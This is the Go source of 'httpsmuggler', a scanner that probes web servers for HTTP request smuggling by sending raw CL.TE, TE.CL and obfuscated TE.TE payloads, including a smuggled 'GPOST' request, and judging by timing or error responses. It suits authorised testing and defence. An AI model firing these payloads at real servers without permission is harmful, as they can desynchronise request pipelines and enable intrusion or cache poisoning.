package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"net"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	version = "1.0.0"
	banner  = `
██╗  ██╗████████╗████████╗██████╗ ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ███████╗██████╗
██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██╔════╝██╔══██╗
███████║   ██║      ██║   ██████╔╝███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     █████╗  ██████╔╝
██╔══██║   ██║      ██║   ██╔═══╝ ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██╔══╝  ██╔══██╗
██║  ██║   ██║      ██║   ██║     ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗███████╗██║  ██║
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝     ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

    HTTP Request Smuggling Detector v%s

    Author: a0x194
    Team:   TryHarder | https://www.tryharder.space
    Tools:  https://www.tryharder.space/tools/
`
)

type SmuggleType string

const (
	CLTE SmuggleType = "CL.TE"
	TECL SmuggleType = "TE.CL"
	TETE SmuggleType = "TE.TE"
)

type Result struct {
	URL        string
	Vulnerable bool
	Type       SmuggleType
	Technique  string
	TimeDiff   time.Duration
	Details    string
}

type Scanner struct {
	timeout time.Duration
	verbose bool
}

func NewScanner(timeout int, verbose bool) *Scanner {
	return &Scanner{
		timeout: time.Duration(timeout) * time.Second,
		verbose: verbose,
	}
}

func (s *Scanner) sendRaw(host string, port string, useTLS bool, payload string) (string, time.Duration, error) {
	var conn net.Conn
	var err error

	start := time.Now()

	dialer := &net.Dialer{Timeout: s.timeout}

	if useTLS {
		tlsConfig := &tls.Config{
			InsecureSkipVerify: true,
		}
		conn, err = tls.DialWithDialer(dialer, "tcp", host+":"+port, tlsConfig)
	} else {
		conn, err = dialer.Dial("tcp", host+":"+port)
	}

	if err != nil {
		return "", 0, err
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(s.timeout))

	_, err = conn.Write([]byte(payload))
	if err != nil {
		return "", 0, err
	}

	response, err := io.ReadAll(conn)
	elapsed := time.Since(start)

	if err != nil && err != io.EOF {
		// Timeout might be expected for some tests
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			return string(response), elapsed, nil
		}
		return string(response), elapsed, err
	}

	return string(response), elapsed, nil
}

func (s *Scanner) testCLTE(targetURL string, host string, port string, useTLS bool) *Result {
	result := &Result{
		URL:  targetURL,
		Type: CLTE,
	}

	// CL.TE detection payload
	// Frontend uses Content-Length, Backend uses Transfer-Encoding
	payload := fmt.Sprintf("POST / HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"Content-Type: application/x-www-form-urlencoded\r\n"+
		"Content-Length: 6\r\n"+
		"Transfer-Encoding: chunked\r\n"+
		"\r\n"+
		"0\r\n"+
		"\r\n"+
		"G", host)

	if s.verbose {
		fmt.Printf("[*] Testing CL.TE on %s\n", targetURL)
	}

	_, time1, err := s.sendRaw(host, port, useTLS, payload)
	if err != nil {
		if s.verbose {
			fmt.Printf("[!] Error: %v\n", err)
		}
		return result
	}

	// Send a normal request to compare timing
	normalPayload := fmt.Sprintf("POST / HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"Content-Type: application/x-www-form-urlencoded\r\n"+
		"Content-Length: 0\r\n"+
		"\r\n", host)

	_, time2, _ := s.sendRaw(host, port, useTLS, normalPayload)

	// If the first request took significantly longer, it might be vulnerable
	timeDiff := time1 - time2
	if timeDiff > 5*time.Second {
		result.Vulnerable = true
		result.Technique = "Time-based detection"
		result.TimeDiff = timeDiff
		result.Details = "Backend appears to wait for more data (Transfer-Encoding processing)"
	}

	return result
}

func (s *Scanner) testTECL(targetURL string, host string, port string, useTLS bool) *Result {
	result := &Result{
		URL:  targetURL,
		Type: TECL,
	}

	// TE.CL detection payload
	// Frontend uses Transfer-Encoding, Backend uses Content-Length
	payload := fmt.Sprintf("POST / HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"Content-Type: application/x-www-form-urlencoded\r\n"+
		"Content-Length: 4\r\n"+
		"Transfer-Encoding: chunked\r\n"+
		"\r\n"+
		"5c\r\n"+
		"GPOST / HTTP/1.1\r\n"+
		"Content-Type: application/x-www-form-urlencoded\r\n"+
		"Content-Length: 15\r\n"+
		"\r\n"+
		"x=1\r\n"+
		"0\r\n"+
		"\r\n", host)

	if s.verbose {
		fmt.Printf("[*] Testing TE.CL on %s\n", targetURL)
	}

	_, time1, err := s.sendRaw(host, port, useTLS, payload)
	if err != nil {
		if s.verbose {
			fmt.Printf("[!] Error: %v\n", err)
		}
		return result
	}

	// Compare with normal request
	normalPayload := fmt.Sprintf("POST / HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"Content-Type: application/x-www-form-urlencoded\r\n"+
		"Content-Length: 0\r\n"+
		"\r\n", host)

	_, time2, _ := s.sendRaw(host, port, useTLS, normalPayload)

	timeDiff := time1 - time2
	if timeDiff > 5*time.Second {
		result.Vulnerable = true
		result.Technique = "Time-based detection"
		result.TimeDiff = timeDiff
		result.Details = "Backend appears to use Content-Length while frontend uses Transfer-Encoding"
	}

	return result
}

func (s *Scanner) testTETE(targetURL string, host string, port string, useTLS bool) *Result {
	result := &Result{
		URL:  targetURL,
		Type: TETE,
	}

	// TE.TE detection - obfuscated Transfer-Encoding
	obfuscations := []string{
		"Transfer-Encoding: chunked\r\nTransfer-encoding: x",
		"Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
		"Transfer-Encoding: xchunked",
		"Transfer-Encoding : chunked",
		"Transfer-Encoding: chunked\r\nTransfer-Encoding:",
		"Transfer-Encoding:\tchunked",
		"X: X\r\nTransfer-Encoding: chunked",
	}

	if s.verbose {
		fmt.Printf("[*] Testing TE.TE obfuscations on %s\n", targetURL)
	}

	for _, obfuscation := range obfuscations {
		payload := fmt.Sprintf("POST / HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: 4\r\n"+
			"%s\r\n"+
			"\r\n"+
			"5c\r\n"+
			"GPOST / HTTP/1.1\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: 15\r\n"+
			"\r\n"+
			"x=1\r\n"+
			"0\r\n"+
			"\r\n", host, obfuscation)

		response, _, err := s.sendRaw(host, port, useTLS, payload)
		if err != nil {
			continue
		}

		// Check for anomalous responses
		if strings.Contains(response, "400") || strings.Contains(response, "Unrecognized method GPOST") {
			result.Vulnerable = true
			result.Technique = "Response analysis"
			result.Details = fmt.Sprintf("TE obfuscation may work: %s", obfuscation)
			return result
		}
	}

	return result
}

func (s *Scanner) ScanURL(targetURL string) []Result {
	var results []Result

	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		if s.verbose {
			fmt.Printf("[!] Invalid URL: %s\n", targetURL)
		}
		return results
	}

	host := parsedURL.Hostname()
	port := parsedURL.Port()
	useTLS := parsedURL.Scheme == "https"

	if port == "" {
		if useTLS {
			port = "443"
		} else {
			port = "80"
		}
	}

	// Test all smuggling types
	clteResult := s.testCLTE(targetURL, host, port, useTLS)
	if clteResult.Vulnerable {
		results = append(results, *clteResult)
	}

	teclResult := s.testTECL(targetURL, host, port, useTLS)
	if teclResult.Vulnerable {
		results = append(results, *teclResult)
	}

	teteResult := s.testTETE(targetURL, host, port, useTLS)
	if teteResult.Vulnerable {
		results = append(results, *teteResult)
	}

	return results
}

func printResult(r Result) {
	red := "\033[31m"
	green := "\033[32m"
	yellow := "\033[33m"
	reset := "\033[0m"

	fmt.Printf("\n%s[POTENTIAL VULNERABILITY]%s %s\n", red, reset, r.URL)
	fmt.Printf("  %s├─%s Type: %s%s%s\n", green, reset, yellow, r.Type, reset)
	fmt.Printf("  %s├─%s Technique: %s\n", green, reset, r.Technique)
	if r.TimeDiff > 0 {
		fmt.Printf("  %s├─%s Time Difference: %v\n", green, reset, r.TimeDiff)
	}
	fmt.Printf("  %s└─%s Details: %s\n", green, reset, r.Details)
}

func main() {
	var (
		target      string
		list        string
		threads     int
		timeout     int
		verbose     bool
		output      string
		showVersion bool
	)

	flag.StringVar(&target, "u", "", "Single target URL")
	flag.StringVar(&list, "l", "", "File containing list of URLs")
	flag.IntVar(&threads, "t", 5, "Number of concurrent threads")
	flag.IntVar(&timeout, "timeout", 15, "Request timeout in seconds")
	flag.BoolVar(&verbose, "v", false, "Verbose output")
	flag.StringVar(&output, "o", "", "Output file for results")
	flag.BoolVar(&showVersion, "version", false, "Show version")

	flag.Parse()

	fmt.Printf(banner, version)

	if showVersion {
		return
	}

	if target == "" && list == "" {
		fmt.Println("\nUsage:")
		fmt.Println("  httpsmuggler -u https://example.com")
		fmt.Println("  httpsmuggler -l urls.txt -t 5")
		fmt.Println("\nFlags:")
		flag.PrintDefaults()
		fmt.Println("\n⚠️  Warning: This tool sends potentially malicious requests.")
		fmt.Println("   Only use against systems you have permission to test.")
		return
	}

	scanner := NewScanner(timeout, verbose)

	var urls []string
	if target != "" {
		urls = append(urls, target)
	}

	if list != "" {
		file, err := os.Open(list)
		if err != nil {
			fmt.Printf("[!] Error opening file: %v\n", err)
			return
		}
		defer file.Close()

		sc := bufio.NewScanner(file)
		for sc.Scan() {
			line := strings.TrimSpace(sc.Text())
			if line != "" && !strings.HasPrefix(line, "#") {
				urls = append(urls, line)
			}
		}
	}

	fmt.Printf("\n[*] Testing %d URL(s) for HTTP Request Smuggling...\n", len(urls))
	fmt.Println("[*] Testing: CL.TE, TE.CL, TE.TE variants")

	var allResults []Result
	var mu sync.Mutex
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, threads)

	for _, u := range urls {
		wg.Add(1)
		semaphore <- struct{}{}

		go func(targetURL string) {
			defer wg.Done()
			defer func() { <-semaphore }()

			results := scanner.ScanURL(targetURL)

			mu.Lock()
			allResults = append(allResults, results...)
			for _, r := range results {
				printResult(r)
			}
			mu.Unlock()
		}(u)
	}

	wg.Wait()

	fmt.Printf("\n[*] Scan complete! Found %d potential vulnerability(ies)\n", len(allResults))

	if len(allResults) > 0 {
		fmt.Println("\n⚠️  Note: These are potential vulnerabilities that require manual verification.")
		fmt.Println("   Use tools like Burp Suite's HTTP Request Smuggler for confirmation.")
	}

	// Save to file
	if output != "" && len(allResults) > 0 {
		file, err := os.Create(output)
		if err != nil {
			fmt.Printf("[!] Error creating output file: %v\n", err)
			return
		}
		defer file.Close()

		for _, r := range allResults {
			line := fmt.Sprintf("%s | %s | %s | %s\n", r.URL, r.Type, r.Technique, r.Details)
			file.WriteString(line)
		}
		fmt.Printf("[*] Results saved to %s\n", output)
	}
}
